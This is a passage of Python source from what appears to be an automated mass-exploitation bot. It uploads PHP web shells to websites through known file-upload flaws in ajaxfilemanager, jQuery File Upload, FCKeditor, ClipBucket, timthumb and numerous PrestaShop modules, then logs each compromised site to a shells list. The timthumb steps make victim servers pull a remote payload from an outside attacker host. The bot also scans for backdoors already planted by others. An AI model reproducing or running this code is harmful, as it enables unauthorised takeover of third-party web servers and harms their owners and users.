		lib = requests.get(url+"/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Zenphoto     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Zenphoto     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			


		req = requests.post(url+'/admin/editor/plugins/ajaxfilemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/admin/editor/plugins/ajaxfilemanager/inc/data.php")
		
		lib = requests.get(url+"/admin/editor/plugins/ajaxfilemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} PHPMyFAQ 2.7.0     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/admin/editor/plugins/ajaxfilemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} PHPMyFAQ 2.7.0     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/server/php/', files=files)

		
		
		lib = requests.get(url+"/server/php/files/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Arrayfiles     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/server/php/files/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Arrayfiles     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			


		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/adminside/server/php/', files=files)

		
		
		lib = requests.get(url+"/images/block/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Design Factory     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/images/block/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Design Factory     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/vehiculo_photos/server/php/', files=files)

		
		
		lib = requests.get(url+"/vehiculo_photos/server/php/files/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} vehiculo     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/vehiculo_photos/server/php/files/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} vehiculo     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/tpl/plugins/upload9.1.0/server/php/', files=files)

		
		
		lib = requests.get(url+"/tpl/plugins/upload9.1.0/server/php/files/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} upload9.1.0     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/tpl/plugins/upload9.1.0/server/php/files/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} upload9.1.0     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/public/upload_nhieuanh/server/php/_index.php', files=files)

		
		
		lib = requests.get(url+"/public/upload_nhieuanh/server/php/files/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Filecms     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/public/upload_nhieuanh/server/php/files/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Filecms     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/global/plugins/jquery-file-upload/server/php/', files=files)

		
		lib = requests.get(url+"/assets/global/plugins/jquery-file-upload/server/php/files/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} jquery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/assets/global/plugins/jquery-file-upload/server/php/files/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} jquery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/web/image/upload.php', files=files)

		
		lib = requests.get(url+"/web/image/Images/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Keybase     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/web/image/Images/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Keybase     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/AndroidFileUpload/fileUpload.php', files=files)

		
		lib = requests.get(url+"/AndroidFileUpload/uploads/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} AndroidFile     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/web/image/Images/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} AndroidFile     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		files = {'NewFile': (fck, open(fck, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/fckeditor/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2F', files=files)

		
		
		lib = requests.get(url+"/userfiles/file/izocin.txt")

		if 'pwned' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} FckEditor     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/fckeditor.txt', 'a').write(url+'/userfiles/file/izocin.txt'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} FckEditor     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		files = {'NewFile': (fck, open(fck, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/plugins/fckeditor/editor/filemanager/connectors/php/upload.php', files=files)

		
		
		lib = requests.get(url+"/ficheiros/conteudos/izocin.txt")

		if 'Success' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Netvidade     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Netvidade-cms.txt', 'a').write(url+'/ficheiros/conteudos/izocin.txt'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Netvidade     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			


		izo = requests.get(url+"/admin/timthumb.php?src=http://picasa.com.sp-exploiter.xyz/timthumb/a.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(url+"/cache/c4e758b00c25ade40a8d29c6cccef6c4")
		lib1 = requests.get(url+"/cache/external_c4e758b00c25ade40a8d29c6cccef6c4")
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4' in izo.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'>'+token[0]+'.php'+'\n')
			sys.exit()
			
		elif '0byt3m1n1' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/cache/c4e758b00c25ade40a8d29c6cccef6c4'+'\n')			

		elif '0byt3m1n1' in lib1.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/cache/external_c4e758b00c25ade40a8d29c6cccef6c4'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			


		izo = requests.get(url+"/scripts/timthumb.php?src=http://picasa.com.sp-exploiter.xyz/timthumb/a.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(url+"/scripts/cache/c4e758b00c25ade40a8d29c6cccef6c4")
		lib1 = requests.get(url+"/scripts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4")
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4' in izo.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'>'+token[0]+'.php'+'\n')
			sys.exit()
			
		elif '0byt3m1n1' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/scrpts/cache/c4e758b00c25ade40a8d29c6cccef6c4'+'\n')			

		elif '0byt3m1n1' in lib1.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/scripts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
				
		
		



		izo = requests.get(url+"/timthumb.php?src=http://picasa.com.sp-exploiter.xyz/timthumb/a.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(url+"/cache/5f966b0701d8a6090a8d0b651d5f7a44")
		lib1 = requests.get(url+"/cache/external_c4e758b00c25ade40a8d29c6cccef6c4")
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4' in izo.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'>'+token[0]+'.php'+'\n')
			sys.exit()
		elif '0byt3m1n1' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/cache/c4e758b00c25ade40a8d29c6cccef6c4'+'\n')			

		elif '0byt3m1n1' in lib1.content:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/cache/external_c4e758b00c25ade40a8d29c6cccef6c4'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} timthumb     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
				
		

		req = requests.post(url+'/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/data.php")
		
		lib = requests.get(url+"/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce plugin     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce plugin     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		
		
		post = {'plupload':'1','name':'../izocin.php'}
		
		files={'file': (filenamexy, shell, 'text/html')}

		req = requests.post(url+'/actions/beats_uploader.php', files=files, data=post)

		token = re.findall('"file_directory":"(.*?)"}', req.text)
		tokens = re.findall('"file_name":"(.*?)",', req.text)

		lib = requests.get(url+'/actions/'+token[0]+'/'+tokens[0]+'.php')


		if 'izocin' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Clipbucked     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/actions/'+token[0]+'/'+tokens[0]+'.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Clipbucked     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
	

		# 35 . rev
		
		cbanGravlib = requests.get(url+'/shell.php')		
		cbanxxGravlib = requests.get(url+'/tmp/error.php')
		cbanxxxGravlib = requests.get(url+'/tmp/shell.php')
		cbanxxxxGravlib = requests.get(url+'/images/shell.php')
		cbanxxxxxGravlib = requests.get(url+'/098.php')
		cbanxxxxxxGravlib = requests.get(url+'/rxr.php?rxr')
		
		
		if 'Uname' in cbanGravlib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in cbanxxGravlib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/tmp/error.php'+'\n')
			sys.exit()
		elif 'Uname' in cbanxxxGravlib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/tmp/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in cbanxxxxGravlib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/images/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in cbanxxxxxGravlib.content:
			print '[{}Unknow]: {} {}1	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/098.php'+'\n')
			sys.exit()
		elif 'Uname' in cbanxxxxxxGravlib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/rxr.php?rxr'+'\n')
			sys.exit()			
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Shell     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
	
			
			

	except:
		pass


def presbot(url):


	
    try:


		# 1 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/columnadverts/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/columnadverts/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} columnadverts     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/columnadverts/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/columnadverts/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} columnadverts     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 2 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtemslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtemslideshow/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtemslideshow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/vtemslideshow/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/vtemslideshow/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtemslideshow     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 3 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/include/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/include/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} realty     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/realty/include/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/realty/include/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} realty     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 4 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/evogallery/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/evogallery/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} evogallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/realty/evogallery/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/realty/evogallery/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} evogallery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 5 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/evogallery2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/evogallery2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} evogallery2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/realty/evogallery2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/realty/evogallery2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} evogallery2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 6 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/resaleform/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/filesupload/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} resaleform     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/filesupload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/filesupload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} resaleform     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 7 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/megaproduct/', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/megaproduct/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} megaproduct     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/megaproduct/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/megaproduct/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} megaproduct     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 8 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/soopamobile/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/soopamobile/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 9 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/soopamobile2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/soopamobile2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 10 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile2/uploadproduct.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile3     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/soopamobile2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/soopamobile2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopamobile3     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 11 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopabanners/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopabanners/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopabanners     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/soopabanners/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/soopabanners/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} soopabanners     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 12 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtermslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtermslideshow/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtermslideshow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/vtermslideshow/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/vtermslideshow/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtermslideshow     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 13 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/simpleslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/simpleslideshow/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} simpleslideshow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/simpleslideshow/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/simpleslideshow/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} simpleslideshow     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 14 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/productpageadverts/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/productpageadverts/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} productpageadverts     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/productpageadverts/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/productpageadverts/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} productpageadverts     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 15 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/homepageadvertise/uploadimage.php', files=bReflexup)
		
